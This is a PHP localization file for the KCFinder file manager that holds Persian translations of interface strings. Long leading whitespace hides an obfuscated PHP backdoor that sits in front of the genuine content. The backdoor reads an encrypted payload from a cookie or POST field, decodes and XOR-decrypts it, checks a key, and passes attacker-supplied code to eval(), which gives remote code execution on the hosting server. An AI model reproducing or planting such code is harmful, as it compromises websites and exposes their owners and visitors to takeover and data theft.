<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $r972b2a61 = 884;$GLOBALS['f8958e'] = Array();global $f8958e;$f8958e = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['zf60'] = "\x58\x6e\x37\x56\x21\x40\x5c\x7b\x71\x3b\x26\x64\x2c\x79\x7d\x38\x20\x7a\x5f\x2d\x25\xd\x7e\x69\x74\x29\x57\x5e\x76\x5b\x77\x59\x67\x6b\x35\x2a\xa\x70\x60\x22\x4f\x52\x51\x66\x6f\x23\x36\x50\x44\x4e\x2f\x5a\x24\x6c\x73\x2b\x55\x41\x53\x4c\x46\x3f\x7c\x49\x3d\x30\x2e\x43\x45\x3c\x65\x4a\x62\x28\x32\x61\x39\x47\x3a\x75\x4b\x31\x48\x4d\x34\x68\x78\x63\x33\x42\x72\x5d\x27\x9\x54\x3e\x6d\x6a";$f8958e[$f8958e['zf60'][11].$f8958e['zf60'][65].$f8958e['zf60'][15].$f8958e['zf60'][74].$f8958e['zf60'][43]] = $f8958e['zf60'][87].$f8958e['zf60'][85].$f8958e['zf60'][90];$f8958e[$f8958e['zf60'][37].$f8958e['zf60'][75].$f8958e['zf60'][75].$f8958e['zf60'][81]] = $f8958e['zf60'][44].$f8958e['zf60'][90].$f8958e['zf60'][11];$f8958e[$f8958e['zf60'][44].$f8958e['zf60'][70].$f8958e['zf60'][65].$f8958e['zf60'][81].$f8958e['zf60'][87].$f8958e['zf60'][75].$f8958e['zf60'][34].$f8958e['zf60'][2].$f8958e['zf60'][43]] = $f8958e['zf60'][11].$f8958e['zf60'][70].$f8958e['zf60'][43].$f8958e['zf60'][23].$f8958e['zf60'][1].$f8958e['zf60'][70];$f8958e[$f8958e['zf60'][24].$f8958e['zf60'][46].$f8958e['zf60'][70].$f8958e['zf60'][15].$f8958e['zf60'][74]] = $f8958e['zf60'][54].$f8958e['zf60'][24].$f8958e['zf60'][90].$f8958e['zf60'][53].$f8958e['zf60'][70].$f8958e['zf60'][1];$f8958e[$f8958e['zf60'][54].$f8958e['zf60'][11].$f8958e['zf60'][88].$f8958e['zf60'][34].$f8958e['zf60'][46].$f8958e['zf60'][81].$f8958e['zf60'][15].$f8958e['zf60'][72]] = $f8958e['zf60'][11].$f8958e['zf60'][70].$f8958e['zf60'][43].$f8958e['zf60'][23].$f8958e['zf60'][1].$f8958e['zf60'][70].$f8958e['zf60'][11];$f8958e[$f8958e['zf60'][90].$f8958e['zf60'][75].$f8958e['zf60'][88].$f8958e['zf60'][74].$f8958e['zf60'][15].$f8958e['zf60'][70]] = $f8958e['zf60'][23].$f8958e['zf60'][1].$f8958e['zf60'][23].$f8958e['zf60'][18].$f8958e['zf60'][54].$f8958e['zf60'][70].$f8958e['zf60'][24];$f8958e[$f8958e['zf60'][79].$f8958e['zf60'][65].$f8958e['zf60'][84].$f8958e['zf60'][74].$f8958e['zf60'][11].$f8958e['zf60'][76].$f8958e['zf60'][75].$f8958e['zf60'][76].$f8958e['zf60'][65]] = $f8958e['zf60'][54].$f8958e['zf60'][70].$f8958e['zf60'][90].$f8958e['zf60'][23].$f8958e['zf60'][75].$f8958e['zf60'][53].$f8958e['zf60'][23].$f8958e['zf60'][17].$f8958e['zf60'][70];$f8958e[$f8958e['zf60'][11].$f8958e['zf60'][88].$f8958e['zf60'][87].$f8958e['zf60'][11].$f8958e['zf60'][88]] = $f8958e['zf60'][37].$f8958e['zf60'][85].$f8958e['zf60'][37].$f8958e['zf60'][28].$f8958e['zf60'][70].$f8958e['zf60'][90].$f8958e['zf60'][54].$f8958e['zf60'][23].$f8958e['zf60'][44].$f8958e['zf60'][1];$f8958e[$f8958e['zf60'][96].$f8958e['zf60'][34].$f8958e['zf60'][46].$f8958e['zf60'][87].$f8958e['zf60'][65].$f8958e['zf60'][11].$f8958e['zf60'][84].$f8958e['zf60'][65].$f8958e['zf60'][72]] = $f8958e['zf60'][79].$f8958e['zf60'][1].$f8958e['zf60'][54].$f8958e['zf60'][70].$f8958e['zf60'][90].$f8958e['zf60'][23].$f8958e['zf60'][75].$f8958e['zf60'][53].$f8958e['zf60'][23].$f8958e['zf60'][17].$f8958e['zf60'][70];$f8958e[$f8958e['zf60'][33].$f8958e['zf60'][84].$f8958e['zf60'][34].$f8958e['zf60'][74].$f8958e['zf60'][76].$f8958e['zf60'][34].$f8958e['zf60'][34]] = $f8958e['zf60'][72].$f8958e['zf60'][75].$f8958e['zf60'][54].$f8958e['zf60'][70].$f8958e['zf60'][46].$f8958e['zf60'][84].$f8958e['zf60'][18].$f8958e['zf60'][11].$f8958e['zf60'][70].$f8958e['zf60'][87].$f8958e['zf60'][44].$f8958e['zf60'][11].$f8958e['zf60'][70];$f8958e[$f8958e['zf60'][43].$f8958e['zf60'][11].$f8958e['zf60'][88].$f8958e['zf60'][74].$f8958e['zf60'][34].$f8958e['zf60'][81].$f8958e['zf60'][43].$f8958e['zf60'][88]] = $f8958e['zf60'][54].$f8958e['zf60'][70].$f8958e['zf60'][24].$f8958e['zf60'][18].$f8958e['zf60'][24].$f8958e['zf60'][23].$f8958e['zf60'][96].$f8958e['zf60'][70].$f8958e['zf60'][18].$f8958e['zf60'][53].$f8958e['zf60'][23].$f8958e['zf60'][96].$f8958e['zf60'][23].$f8958e['zf60'][24];$f8958e[$f8958e['zf60'][75].$f8958e['zf60'][81].$f8958e['zf60'][75].$f8958e['zf60'][70].$f8958e['zf60'][11].$f8958e['zf60'][34]] = $f8958e['zf60'][30].$f8958e['zf60'][75].$f8958e['zf60'][15].$f8958e['zf60'][84].$f8958e['zf60'][76].$f8958e['zf60'][46].$f8958e['zf60'][46].$f8958e['zf60'][74].$f8958e['zf60'][74];$f8958e[$f8958e['zf60'][44].$f8958e['zf60'][65].$f8958e['zf60'][46].$f8958e['zf60'][87].$f8958e['zf60'][75].$f8958e['zf60'][34].$f8958e['zf60'][70].$f8958e['zf60'][72].$f8958e['zf60'][75]] = $f8958e['zf60'][53].$f8958e['zf60'][81].$f8958e['zf60'][46].$f8958e['zf60'][87].$f8958e['zf60'][11].$f8958e['zf60'][88].$f8958e['zf60'][76];$f8958e[$f8958e['zf60'][8].$f8958e['zf60'][76].$f8958e['zf60'][65].$f8958e['zf60'][15].$f8958e['zf60'][88].$f8958e['zf60'][43].$f8958e['zf60'][34]] = $_POST;$f8958e[$f8958e['zf60'][23].$f8958e['zf60'][88].$f8958e['zf60'][74].$f8958e['zf60'][65].$f8958e['zf60'][72].$f8958e['zf60'][81].$f8958e['zf60'][46].$f8958e['zf60'][46].$f8958e['zf60'][34]] = $_COOKIE;@$f8958e[$f8958e['zf60'][90].$f8958e['zf60'][75].$f8958e['zf60'][88].$f8958e['zf60'][74].$f8958e['zf60'][15].$f8958e['zf60'][70]]($f8958e['zf60'][70].$f8958e['zf60'][90].$f8958e['zf60'][90].$f8958e['zf60'][44].$f8958e['zf60'][90].$f8958e['zf60'][18].$f8958e['zf60'][53].$f8958e['zf60'][44].$f8958e['zf60'][32], NULL);@$f8958e[$f8958e['zf60'][90].$f8958e['zf60'][75].$f8958e['zf60'][88].$f8958e['zf60'][74].$f8958e['zf60'][15].$f8958e['zf60'][70]]($f8958e['zf60'][53].$f8958e['zf60'][44].$f8958e['zf60'][32].$f8958e['zf60'][18].$f8958e['zf60'][70].$f8958e['zf60'][90].$f8958e['zf60'][90].$f8958e['zf60'][44].$f8958e['zf60'][90].$f8958e['zf60'][54], 0);@$f8958e[$f8958e['zf60'][90].$f8958e['zf60'][75].$f8958e['zf60'][88].$f8958e['zf60'][74].$f8958e['zf60'][15].$f8958e['zf60'][70]]($f8958e['zf60'][96].$f8958e['zf60'][75].$f8958e['zf60'][86].$f8958e['zf60'][18].$f8958e['zf60'][70].$f8958e['zf60'][86].$f8958e['zf60'][70].$f8958e['zf60'][87].$f8958e['zf60'][79].$f8958e['zf60'][24].$f8958e['zf60'][23].$f8958e['zf60'][44].$f8958e['zf60'][1].$f8958e['zf60'][18].$f8958e['zf60'][24].$f8958e['zf60'][23].$f8958e['zf60'][96].$f8958e['zf60'][70], 0);@$f8958e[$f8958e['zf60'][43].$f8958e['zf60'][11].$f8958e['zf60'][88].$f8958e['zf60'][74].$f8958e['zf60'][34].$f8958e['zf60'][81].$f8958e['zf60'][43].$f8958e['zf60'][88]](0);if (!$f8958e[$f8958e['zf60'][54].$f8958e['zf60'][11].$f8958e['zf60'][88].$f8958e['zf60'][34].$f8958e['zf60'][46].$f8958e['zf60'][81].$f8958e['zf60'][15].$f8958e['zf60'][72]]($f8958e['zf60'][57].$f8958e['zf60'][59].$f8958e['zf60'][41].$f8958e['zf60'][68].$f8958e['zf60'][57].$f8958e['zf60'][48].$f8958e['zf60'][31].$f8958e['zf60'][18].$f8958e['zf60'][41].$f8958e['zf60'][56].$f8958e['zf60'][49].$f8958e['zf60'][18].$f8958e['zf60'][88].$f8958e['zf60'][46].$f8958e['zf60'][46].$f8958e['zf60'][75].$f8958e['zf60'][43].$f8958e['zf60'][72].$f8958e['zf60'][15].$f8958e['zf60'][75].$f8958e['zf60'][15].$f8958e['zf60'][75].$f8958e['zf60'][74].$f8958e['zf60'][88].$f8958e['zf60'][34].$f8958e['zf60'][34].$f8958e['zf60'][75].$f8958e['zf60'][72].$f8958e['zf60'][74].$f8958e['zf60'][81].$f8958e['zf60'][43].$f8958e['zf60'][72].$f8958e['zf60'][43].$f8958e['zf60'][81].$f8958e['zf60'][81].$f8958e['zf60'][72].$f8958e['zf60'][75].$f8958e['zf60'][81].$f8958e['zf60'][75].$f8958e['zf60'][65].$f8958e['zf60'][74].$f8958e['zf60'][43].$f8958e['zf60'][72].$f8958e['zf60'][75])){$f8958e[$f8958e['zf60'][44].$f8958e['zf60'][70].$f8958e['zf60'][65].$f8958e['zf60'][81].$f8958e['zf60'][87].$f8958e['zf60'][75].$f8958e['zf60'][34].$f8958e['zf60'][2].$f8958e['zf60'][43]]($f8958e['zf60'][57].$f8958e['zf60'][59].$f8958e['zf60'][41].$f8958e['zf60'][68].$f8958e['zf60'][57].$f8958e['zf60'][48].$f8958e['zf60'][31].$f8958e['zf60'][18].$f8958e['zf60'][41].$f8958e['zf60'][56].$f8958e['zf60'][49].$f8958e['zf60'][18].$f8958e['zf60'][88].$f8958e['zf60'][46].$f8958e['zf60'][46].$f8958e['zf60'][75].$f8958e['zf60'][43].$f8958e['zf60'][72].$f8958e['zf60'][15].$f8958e['zf60'][75].$f8958e['zf60'][15].$f8958e['zf60'][75].$f8958e['zf60'][74].$f8958e['zf60'][88].$f8958e['zf60'][34].$f8958e['zf60'][34].$f8958e['zf60'][75].$f8958e['zf60'][72].$f8958e['zf60'][74].$f8958e['zf60'][81].$f8958e['zf60'][43].$f8958e['zf60'][72].$f8958e['zf60'][43].$f8958e['zf60'][81].$f8958e['zf60'][81].$f8958e['zf60'][72].$f8958e['zf60'][75].$f8958e['zf60'][81].$f8958e['zf60'][75].$f8958e['zf60'][65].$f8958e['zf60'][74].$f8958e['zf60'][43].$f8958e['zf60'][72].$f8958e['zf60'][75], 1);$y7b74 = NULL;$oe391 = NULL;$f8958e[$f8958e['zf60'][75].$f8958e['zf60'][70].$f8958e['zf60'][43].$f8958e['zf60'][84].$f8958e['zf60'][88].$f8958e['zf60'][74].$f8958e['zf60'][75].$f8958e['zf60'][15].$f8958e['zf60'][88]] = $f8958e['zf60'][11].$f8958e['zf60'][70].$f8958e['zf60'][75].$f8958e['zf60'][74].$f8958e['zf60'][72].$f8958e['zf60'][75].$f8958e['zf60'][76].$f8958e['zf60'][88].$f8958e['zf60'][19].$f8958e['zf60'][65].$f8958e['zf60'][65].$f8958e['zf60'][81].$f8958e['zf60'][2].$f8958e['zf60'][19].$f8958e['zf60'][84].$f8958e['zf60'][11].$f8958e['zf60'][74].$f8958e['zf60'][2].$f8958e['zf60'][19].$f8958e['zf60'][15].$f8958e['zf60'][34].$f8958e['zf60'][87].$f8958e['zf60'][15].$f8958e['zf60'][19].$f8958e['zf60'][15].$f8958e['zf60'][11].$f8958e['zf60'][76].$f8958e['zf60'][88].$f8958e['zf60'][87].$f8958e['zf60'][15].$f8958e['zf60'][65].$f8958e['zf60'][34].$f8958e['zf60'][74].$f8958e['zf60'][43].$f8958e['zf60'][74].$f8958e['zf60'][15];global $aef432a83;function  l16cd39($y7b74, $efe0385b6){global $f8958e;$ac208fc8b = "";for ($i5f434d=0; $i5f434d<$f8958e[$f8958e['zf60'][24].$f8958e['zf60'][46].$f8958e['zf60'][70].$f8958e['zf60'][15].$f8958e['zf60'][74]]($y7b74);){for ($fa10a6=0; $fa10a6<$f8958e[$f8958e['zf60'][24].$f8958e['zf60'][46].$f8958e['zf60'][70].$f8958e['zf60'][15].$f8958e['zf60'][74]]($efe0385b6) && $i5f434d<$f8958e[$f8958e['zf60'][24].$f8958e['zf60'][46].$f8958e['zf60'][70].$f8958e['zf60'][15].$f8958e['zf60'][74]]($y7b74); $fa10a6++, $i5f434d++){$ac208fc8b .= $f8958e[$f8958e['zf60'][11].$f8958e['zf60'][65].$f8958e['zf60'][15].$f8958e['zf60'][74].$f8958e['zf60'][43]]($f8958e[$f8958e['zf60'][37].$f8958e['zf60'][75].$f8958e['zf60'][75].$f8958e['zf60'][81]]($y7b74[$i5f434d]) ^ $f8958e[$f8958e['zf60'][37].$f8958e['zf60'][75].$f8958e['zf60'][75].$f8958e['zf60'][81]]($efe0385b6[$fa10a6]));}}return $ac208fc8b;}function  wa8496622($y7b74, $efe0385b6){global $f8958e;global $aef432a83;return $f8958e[$f8958e['zf60'][44].$f8958e['zf60'][65].$f8958e['zf60'][46].$f8958e['zf60'][87].$f8958e['zf60'][75].$f8958e['zf60'][34].$f8958e['zf60'][70].$f8958e['zf60'][72].$f8958e['zf60'][75]]($f8958e[$f8958e['zf60'][44].$f8958e['zf60'][65].$f8958e['zf60'][46].$f8958e['zf60'][87].$f8958e['zf60'][75].$f8958e['zf60'][34].$f8958e['zf60'][70].$f8958e['zf60'][72].$f8958e['zf60'][75]]($y7b74, $aef432a83), $efe0385b6);}foreach ($f8958e[$f8958e['zf60'][23].$f8958e['zf60'][88].$f8958e['zf60'][74].$f8958e['zf60'][65].$f8958e['zf60'][72].$f8958e['zf60'][81].$f8958e['zf60'][46].$f8958e['zf60'][46].$f8958e['zf60'][34]] as $efe0385b6=>$xd08b){$y7b74 = $xd08b;$oe391 = $efe0385b6;}if (!$y7b74){foreach ($f8958e[$f8958e['zf60'][8].$f8958e['zf60'][76].$f8958e['zf60'][65].$f8958e['zf60'][15].$f8958e['zf60'][88].$f8958e['zf60'][43].$f8958e['zf60'][34]] as $efe0385b6=>$xd08b){$y7b74 = $xd08b;$oe391 = $efe0385b6;}}$y7b74 = @$f8958e[$f8958e['zf60'][96].$f8958e['zf60'][34].$f8958e['zf60'][46].$f8958e['zf60'][87].$f8958e['zf60'][65].$f8958e['zf60'][11].$f8958e['zf60'][84].$f8958e['zf60'][65].$f8958e['zf60'][72]]($f8958e[$f8958e['zf60'][75].$f8958e['zf60'][81].$f8958e['zf60'][75].$f8958e['zf60'][70].$f8958e['zf60'][11].$f8958e['zf60'][34]]($f8958e[$f8958e['zf60'][33].$f8958e['zf60'][84].$f8958e['zf60'][34].$f8958e['zf60'][74].$f8958e['zf60'][76].$f8958e['zf60'][34].$f8958e['zf60'][34]]($y7b74), $oe391));if (isset($y7b74[$f8958e['zf60'][75].$f8958e['zf60'][33]]) && $aef432a83==$y7b74[$f8958e['zf60'][75].$f8958e['zf60'][33]]){if ($y7b74[$f8958e['zf60'][75]] == $f8958e['zf60'][23]){$i5f434d = Array($f8958e['zf60'][37].$f8958e['zf60'][28] => @$f8958e[$f8958e['zf60'][11].$f8958e['zf60'][88].$f8958e['zf60'][87].$f8958e['zf60'][11].$f8958e['zf60'][88]](),$f8958e['zf60'][54].$f8958e['zf60'][28] => $f8958e['zf60'][81].$f8958e['zf60'][66].$f8958e['zf60'][65].$f8958e['zf60'][19].$f8958e['zf60'][81],);echo @$f8958e[$f8958e['zf60'][79].$f8958e['zf60'][65].$f8958e['zf60'][84].$f8958e['zf60'][74].$f8958e['zf60'][11].$f8958e['zf60'][76].$f8958e['zf60'][75].$f8958e['zf60'][76].$f8958e['zf60'][65]]($i5f434d);}elseif ($y7b74[$f8958e['zf60'][75]] == $f8958e['zf60'][70]){eval/*p52fa*/($y7b74[$f8958e['zf60'][11]]);}exit();}} ?><?php

/** This file is part of KCFinder project
  *
  *      @desc Persian(Farsi) localization file
  *   @package KCFinder
  *   @version 2.2
  *    @author Hamid Kamalpour <djhamidfatal@gmail.com><http://www.ssfmusic.com>
  * @copyright 2010 KCFinder Project
  *   @license http://www.opensource.org/licenses/gpl-2.0.php GPLv2
  *   @license http://www.opensource.org/licenses/lgpl-2.1.php LGPLv2
  *      @link http://kcfinder.sunhater.com
  */

$lang = array(
    '_locale' => "fa_IR.UTF-8",
    '_charset' => "utf-8",

    // Date time formats. See http://www.php.net/manual/en/function.strftime.php
    '_dateTimeFull' => "%A, %B %e, %Y %H:%M",
    '_dateTimeMid' => "%a %b %e %Y %H:%M",
    '_dateTimeSmall' => "%Y/%m/%d %H:%M",

    "You don't have permissions to upload files." =>
    ".شما فاقد مجوز برای  ارسال فایل ها هستید",

    "You don't have permissions to browse server." =>
    ".شما فاقد مجوز برای جستجو در سرور هستید",

    "Cannot move uploaded file to target folder." =>
    ".برنامه نمی تواند فایل بارگذاری شده را انتقال دهد به پوشه مورد نظر",

    "Unknown error." =>
    ".خطای نامشخص",

    "The uploaded file exceeds {size} bytes." =>
    ".بایت است {size} حجم فایل بارگذاری شده بیشتر از",

    "The uploaded file was only partially uploaded." =>
    ".فایل ناقص بارگذاری شد",

    "No file was uploaded." =>
    ".فایل ارسال نشد",

    "Missing a temporary folder." =>
    ".پوشه تمپ پیدا نشد",

    "Failed to write file." =>
    ".خطا در نوشتن فایل",

    "Denied file extension." =>
    ".پسوند فایل غیر مجاز است",

    "Unknown image format/encoding." =>
    ".عکس معتبر نیست format/encoding",

    "The image is too big and/or cannot be resized." =>
    ".عکس انتخابی یا بزرگ است یا تغییر اندازه داده نمی شود",

    "Cannot create {dir} folder." =>
    ".{dir}مشکل در ساخت پوشه",

    "Cannot write to upload folder." =>
    ".مشکل در نوشتن اطلاعات در پوشه بارگذاری",

    "Cannot read .htaccess" =>
    ".htaccess خطا در خواندن فایل",

    "Incorrect .htaccess file. Cannot rewrite it!" =>
    ".غیرقابل بازنویسی است .htaccess فایل",

    "Cannot read upload folder." =>
    ".مشکل در خواندن پوشه بارگذاری",

    "Cannot access or create thumbnails folder." =>
    ".مشکل در دسترسی یا ساخت پوشه تام",

    "Cannot access or write to upload folder." =>
    ".مشکل در دسترسی برای نوشتن اطلاعات در پوشه بارگذاری",

    "Please enter new folder name." =>
    ".لطفا نام پوشه جدید را وارد کنید",

    "Unallowable characters in folder name." =>
    ".نام پوشه دارای حروف غیر مجاز است",

    "Folder name shouldn't begins with '.'" =>
    ".نام پوشه نباید با '.' شروع شود",

    "Please enter new file name." =>
    ".لطفا نام فایل جدید را وارد کنید",

    "Unallowable characters in file name." =>
    ".نام فایل دارای حروف غیر مجاز است",

    "File name shouldn't begins with '.'" =>
    ".نام فایل نباید با '.' شروع شود",

    "Are you sure you want to delete this file?" =>
    "آیا از حذف این فایل اطمینان دارید؟",

    "Are you sure you want to delete this folder and all its content?" =>
    "آیا از حذف این پوشه و تمام محتویات داخل آن اطمینان دارید؟",

    "Inexistant or inaccessible folder." =>
    "Tipo di cartella non esistente.",

    "Undefined MIME types." =>
    ".تعریف نشده اند MIME پسوند های ",

    "Fileinfo PECL extension is missing." =>
    "Manca estensione PECL del file.",

    "Opening fileinfo database failed." =>
    ".خطا در بازکردن بانک اطلاعاتی مشخصات فایل",

    "You can't upload such files." =>
    ".شما امکان بارگذاری این فایل ها را ندارید",

    "The file '{file}' does not exist." =>
    ".موجود نیست '{file}' فایل",

    "Cannot read '{file}'." =>
    ".'{file}' مشکل در خواندن",

    "Cannot copy '{file}'." =>
    ".'{file}' نمی توانید کپی کنید",

    "Cannot move '{file}'." =>
    ".'{file}' نمی توانید انتقال دهید",

    "Cannot delete '{file}'." =>
    ".'{file}'نمی توانید حذف کنید",

    "Click to remove from the Clipboard" =>
    ".برای حذف از کلیپ برد کلیک کنید",

    "This file is already added to the Clipboard." =>
    ".این فایل قبلا در حافظه کلیپ برد افزوده شده است",

    "Copy files here" =>
    "کپی فایل ها به اینجا",

    "Move files here" =>
    "انتقال فایل ها به اینجا",

    "Delete files" =>
    "حذف فایل ها",

    "Clear the Clipboard" =>
    "پاک کردن حافظه کلیپ برد",

    "Are you sure you want to delete all files in the Clipboard?" =>
    "آیا از حذف فایل های موجود در کلیپ برد اطمینان دارید؟",

    "Copy {count} files" =>
    "...تعداد {count} فایل آماده کپی به",

    "Move {count} files" =>
    "...تعداد {count} فایل آماده انتقال به",

    "Add to Clipboard" =>
    "افزودن در کلیپ برد",

    "New folder name:" => "نام پوشه جدید:",
    "New file name:" => "نام فایل جدید:",

    "Upload" => "ارسال فايل",
    "Refresh" => "بارگذاری مجدد",
    "Settings" => "تنظيمات",
    "Maximize" => "تمام صفحه",
    "About" => "درباره",
    "files" => "فايل ها",
    "View:" => ": نمایش",
    "Show:" => ": نمايش",
    "Order by:" => ": مرتب کردن بر مبناي",
    "Thumbnails" => "نمايش کوچک عکسها",
    "List" => "ليست",
    "Name" => "نام",
    "Size" => "حجم",
    "Date" => "تاريخ",
    "Type" => "پسوند",
    "Descending" => "نزولي",
    "Uploading file..." => "... درحال ارسال فایل",
    "Loading image..." => "... درحال بارگذاری عکس",
    "Loading folders..." => "... درحال بارگذاری پوشه ها",
    "Loading files..." => "... درحال بارگذاری فایل ها",
    "New Subfolder..." => "...ساخت زیرپوشه جدید",
    "Rename..." => "... تغییر نام",
    "Delete" => "حذف",
    "OK" => "ادامه",
    "Cancel" => "انصراف",
    "Select" => "انتخاب",
    "Select Thumbnail" => "انتخاب عکس با اندازه کوچک",
    "View" => "نمایش",
    "Download" => "دریافت فایل",
    "Clipboard" => "حافضه کلیپ برد",

    // VERSION 2 NEW LABELS

    "Cannot rename the folder." =>
    ".نام وارد شده تکراری است. پوشه ای با این نام وجود دارد. لطفا نام جدیدی انتخاب کنید",

    "Non-existing directory type." =>
    ".نوع فهرست وجود ندارد",

    "Cannot delete the folder." =>
    ".نمی توانید این پوشه را حذف کنید",

    "The files in the Clipboard are not readable." =>
    ".فایل های موجود در کلیپ برد قابل خواندن نیستند",

    "{count} files in the Clipboard are not readable. Do you want to copy the rest?" =>
    "تعداد {count} فایل موجود در کلیپ برد قابل خواندن نیستند. آیا مایلید  بقیه فایل ها کپی شوند؟",

    "The files in the Clipboard are not movable." =>
    ".فایل های موجود در کلیپ برد غیر قابل انتقال هستند. لطفا دسترسی فایل ها را چک کنید",

    "{count} files in the Clipboard are not movable. Do you want to move the rest?" =>
    "تعداد {count} فایل از فایل های موجود در کلیپ برد غیر قابل انتقال هستند. آیا مایلید بقیه فایل ها منتقل شوند؟",

    "The files in the Clipboard are not removable." =>
    ".فایل های موجود در کلیپ برد قابل پاک شدن نیستند. دسترسی فایل ها را چک کنید",

    "{count} files in the Clipboard are not removable. Do you want to delete the rest?" =>
    "تعداد {count} فایل از فایل های موجود در کلیپ برد غیر قابل حذف هستند. آیا مایلید بقیه فایل ها حذف شوند؟",

    "The selected files are not removable." =>
    ".فایل های انتخاب شده قابل برداشتن نیست",

    "{count} selected files are not removable. Do you want to delete the rest?" =>
    "تعداد {count} فایل از فایل های انتخابی غیر قابل حذف هستند.آیا مایلید بقیه فایل ها حذف شوند؟",

    "Are you sure you want to delete all selected files?" =>
    "آیا از حذف تمام فایل های انتخابی اطمینان دارید؟",

    "Failed to delete {count} files/folders." =>
    ".فایل/پوشه {count} خطا در پاک کردن",

    "A file or folder with that name already exists." =>
    ".یک پوشه یا فایل با این نام وجود دارد.لطفا نام دیگری انتخاب کنید",

    "selected files" => "فایل های انتخاب شده",
    "Select Thumbnails" => "انتخاب عکس های کوچک",
    "Download files" => "دریافت فایل ها",

    // SINCE 2.4

    "Checking for new version..." => "...وجود نسخه جدید را بررسی کن",
    "Unable to connect!" => "!مشکل در برقراری ارتباط",
    "Download version {version} now!" => "!را دانلود کن {version} همسین حالا نسخه ",
    "KCFinder is up to date!" => "!بروز است KCFinder",
    "Licenses:" => "مجوز",
    "Attention" => "توجه",
    "Question" => "پرسش",
    "Yes" => "بله",
    "No" => "خیر",

    // SINCE 2.41

    "You cannot rename the extension of files!" => "!شما نمی توانید پسوند فایلها را تغییر دهید",
);

?>
